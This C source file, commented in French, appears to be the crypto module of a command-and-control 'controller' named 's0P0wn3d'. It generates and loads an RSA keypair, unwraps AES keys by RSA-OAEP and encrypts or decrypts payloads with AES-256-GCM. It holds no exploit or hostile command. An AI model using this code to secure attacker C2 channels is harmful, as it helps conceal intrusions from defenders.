/*
 * s0P0wn3d — Implémentation du module crypto du contrôleur (OpenSSL).
 */

#include "crypto.h"
#include "../shared/base64.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <openssl/rand.h>

static EVP_PKEY *rsa_keypair = NULL;
static char key_dir_path[256] = "keys";

/* ─── Génération / chargement RSA ──────────────────────────────────────────── */

int crypto_init(const char *key_dir) {
    if (key_dir) {
        strncpy(key_dir_path, key_dir, sizeof(key_dir_path) - 1);
    }

    char priv_path[512], pub_path[512];
    snprintf(priv_path, sizeof(priv_path), "%s/controller_rsa_private.pem", key_dir_path);
    snprintf(pub_path, sizeof(pub_path), "%s/controller_rsa_public.pem", key_dir_path);

    /* Vérifier si les clés existent déjà */
    struct stat st;
    if (stat(priv_path, &st) == 0) {
        /* Charger depuis le disque */
        FILE *fp = fopen(priv_path, "r");
        if (!fp) {
            fprintf(stderr, "[-] Impossible d'ouvrir %s\n", priv_path);
            return -1;
        }
        rsa_keypair = PEM_read_PrivateKey(fp, NULL, NULL, NULL);
        fclose(fp);
        if (!rsa_keypair) {
            fprintf(stderr, "[-] Impossible de charger la clé privée RSA\n");
            return -1;
        }
        printf("[+] Clés RSA chargées depuis %s\n", priv_path);
    } else {
        /* Générer de nouvelles clés */
        printf("[*] Génération de la paire de clés RSA-%d...\n", RSA_KEY_SIZE);
        EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new_id(EVP_PKEY_RSA, NULL);
        if (!ctx) {
            fprintf(stderr, "[-] EVP_PKEY_CTX_new_id échoué\n");
            return -1;
        }

        if (EVP_PKEY_keygen_init(ctx) <= 0 ||
            EVP_PKEY_CTX_set_rsa_keygen_bits(ctx, RSA_KEY_SIZE) <= 0) {
            fprintf(stderr, "[-] Configuration keygen échouée\n");
            EVP_PKEY_CTX_free(ctx);
            return -1;
        }

        if (EVP_PKEY_keygen(ctx, &rsa_keypair) <= 0) {
            fprintf(stderr, "[-] Génération de clé échouée\n");
            EVP_PKEY_CTX_free(ctx);
            return -1;
        }
        EVP_PKEY_CTX_free(ctx);

        /* Créer le répertoire */
        mkdir(key_dir_path, 0700);

        /* Sauvegarder la clé privée */
        FILE *fp = fopen(priv_path, "w");
        if (fp) {
            PEM_write_PrivateKey(fp, rsa_keypair, NULL, NULL, 0, NULL, NULL);
            fclose(fp);
        }

        /* Sauvegarder la clé publique */
        fp = fopen(pub_path, "w");
        if (fp) {
            PEM_write_PUBKEY(fp, rsa_keypair);
            fclose(fp);
        }

        printf("[+] Nouvelle paire de clés RSA générée et sauvegardée\n");
    }

    return 0;
}

void crypto_cleanup(void) {
    if (rsa_keypair) {
        EVP_PKEY_free(rsa_keypair);
        rsa_keypair = NULL;
    }
}

char *crypto_get_public_key_pem(void) {
    if (!rsa_keypair) return NULL;

    BIO *bio = BIO_new(BIO_s_mem());
    if (!bio) return NULL;

    PEM_write_bio_PUBKEY(bio, rsa_keypair);

    char *data;
    long len = BIO_get_mem_data(bio, &data);
    char *result = malloc(len + 1);
    if (result) {
        memcpy(result, data, len);
        result[len] = '\0';
    }
    BIO_free(bio);
    return result;
}

/* ─── RSA-OAEP décryptage de clé AES ───────────────────────────────────────── */

int crypto_decrypt_aes_key(const char *encrypted_key_b64, uint8_t *aes_key) {
    if (!rsa_keypair || !encrypted_key_b64 || !aes_key)
        return -1;

    /* Décoder base64 */
    size_t enc_len = base64_decoded_len(encrypted_key_b64);
    uint8_t *enc_data = malloc(enc_len);
    if (!enc_data) return -1;
    size_t actual_len = base64_decode(encrypted_key_b64, enc_data);

    /* Déchiffrer avec RSA-OAEP */
    EVP_PKEY_CTX *ctx = EVP_PKEY_CTX_new(rsa_keypair, NULL);
    if (!ctx) { free(enc_data); return -1; }

    if (EVP_PKEY_decrypt_init(ctx) <= 0 ||
        EVP_PKEY_CTX_set_rsa_padding(ctx, RSA_PKCS1_OAEP_PADDING) <= 0 ||
        EVP_PKEY_CTX_set_rsa_oaep_md(ctx, EVP_sha256()) <= 0 ||
        EVP_PKEY_CTX_set_rsa_mgf1_md(ctx, EVP_sha256()) <= 0) {
        EVP_PKEY_CTX_free(ctx);
        free(enc_data);
        return -1;
    }

    /* Déterminer la taille de sortie nécessaire */
    size_t out_len = 0;
    if (EVP_PKEY_decrypt(ctx, NULL, &out_len, enc_data, actual_len) <= 0) {
        unsigned long err = ERR_get_error();
        char err_buf[256];
        ERR_error_string_n(err, err_buf, sizeof(err_buf));
        fprintf(stderr, "[-] RSA-OAEP decrypt (size check) échoué: %s\n", err_buf);
        EVP_PKEY_CTX_free(ctx);
        free(enc_data);
        return -1;
    }

    uint8_t *dec_buf = malloc(out_len);
    if (!dec_buf) {
        EVP_PKEY_CTX_free(ctx);
        free(enc_data);
        return -1;
    }

    if (EVP_PKEY_decrypt(ctx, dec_buf, &out_len, enc_data, actual_len) <= 0) {
        fprintf(stderr, "[-] RSA-OAEP decrypt échoué\n");
        free(dec_buf);
        EVP_PKEY_CTX_free(ctx);
        free(enc_data);
        return -1;
    }
    memcpy(aes_key, dec_buf, AES_KEY_SIZE);
    free(dec_buf);

    EVP_PKEY_CTX_free(ctx);
    free(enc_data);
    return 0;
}

/* ─── AES-256-GCM ───────────────────────────────────────────────────────────── */

int crypto_aes_encrypt(const uint8_t *aes_key, const uint8_t *plaintext,
                       size_t pt_len, char **nonce_b64, char **payload_b64,
                       char **tag_b64) {
    uint8_t nonce[AES_NONCE_SIZE];
    uint8_t *ciphertext = malloc(pt_len);
    uint8_t tag[AES_TAG_SIZE];
    if (!ciphertext) return -1;

    /* Générer nonce aléatoire */
    if (RAND_bytes(nonce, sizeof(nonce)) != 1) {
        free(ciphertext);
        return -1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return -1; }

    int ret = 0;
    int out_len = 0;

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, AES_NONCE_SIZE, NULL) != 1 ||
        EVP_EncryptInit_ex(ctx, NULL, NULL, aes_key, nonce) != 1 ||
        EVP_EncryptUpdate(ctx, ciphertext, &out_len, plaintext, pt_len) != 1) {
        ret = -1;
        goto cleanup;
    }

    int final_len = 0;
    if (EVP_EncryptFinal_ex(ctx, ciphertext + out_len, &final_len) != 1) {
        ret = -1;
        goto cleanup;
    }
    out_len += final_len;

    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_TAG_SIZE, tag) != 1) {
        ret = -1;
        goto cleanup;
    }

    /* Encoder en base64 */
    *nonce_b64 = base64_encode(nonce, AES_NONCE_SIZE);
    *payload_b64 = base64_encode(ciphertext, out_len);
    *tag_b64 = base64_encode(tag, AES_TAG_SIZE);

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    free(ciphertext);
    return ret;
}

int crypto_aes_decrypt(const uint8_t *aes_key, const char *nonce_b64,
                       const char *payload_b64, const char *tag_b64,
                       uint8_t *output, size_t max_out) {
    uint8_t nonce[AES_NONCE_SIZE];
    uint8_t tag[AES_TAG_SIZE];

    size_t nonce_len = base64_decode(nonce_b64, nonce);
    size_t tag_len = base64_decode(tag_b64, tag);
    if (nonce_len != AES_NONCE_SIZE || tag_len != AES_TAG_SIZE)
        return -1;

    size_t ct_len = base64_decoded_len(payload_b64);
    uint8_t *ciphertext = malloc(ct_len);
    if (!ciphertext) return -1;
    size_t ct_actual = base64_decode(payload_b64, ciphertext);

    if (ct_actual > max_out) {
        free(ciphertext);
        return -1;
    }

    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) { free(ciphertext); return -1; }

    int ret = -1;
    int out_len = 0;

    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL) != 1 ||
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, AES_NONCE_SIZE, NULL) != 1 ||
        EVP_DecryptInit_ex(ctx, NULL, NULL, aes_key, nonce) != 1 ||
        EVP_DecryptUpdate(ctx, output, &out_len, ciphertext, ct_actual) != 1) {
        goto cleanup;
    }

    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, AES_TAG_SIZE, tag);

    int final_len = 0;
    if (EVP_DecryptFinal_ex(ctx, output + out_len, &final_len) != 1) {
        /* Authentification échouée */
        goto cleanup;
    }
    out_len += final_len;
    ret = out_len;

cleanup:
    EVP_CIPHER_CTX_free(ctx);
    free(ciphertext);
    return ret;
}
